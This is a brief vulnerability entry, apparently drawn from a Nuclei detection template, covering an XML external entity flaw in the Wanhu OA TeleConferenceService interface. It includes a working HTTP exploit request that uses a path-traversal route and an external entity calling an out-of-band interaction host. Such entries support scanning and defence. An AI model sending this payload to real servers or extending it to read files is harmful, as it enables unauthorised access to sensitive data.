# Vulnerability: Wanhu OA TeleConferenceService Interface - XML External Entity Injection
**Classification:** CWE-611
**Source:** Nuclei Template (`wanhu-teleconferenceservice-xxe.yaml`)

## Description
There is an XXE injection vulnerability in the Wanhu OA TeleConferenceService interface. An attacker can use the vulnerability to continue XXE injection to obtain sensitive information on the server.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService HTTP/1.1
Host: {{Hostname}}

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://{{interactsh-url}}" >]>
<value>&xxe;</value>
```

